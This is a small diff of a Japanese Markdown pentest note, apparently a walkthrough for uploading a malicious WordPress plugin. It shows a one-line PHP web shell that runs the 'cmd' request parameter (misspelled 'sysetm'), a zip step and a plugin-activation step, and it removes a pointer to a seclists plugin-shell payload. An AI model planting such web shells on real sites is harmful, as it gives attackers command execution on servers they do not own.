@@ -155,12 +155,10 @@ zip <output_name> <file>
 echo sysetm($_GET["cmd"]); 
 ?>
 ```
-- 補足：以下のパスに、webshellのペイロードがある
-	- `/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php`
 
 2. zip化する
 ```zsh
-
+zip <output_name> <file>
 ```
 
 3. アップロード→Activate Plugin
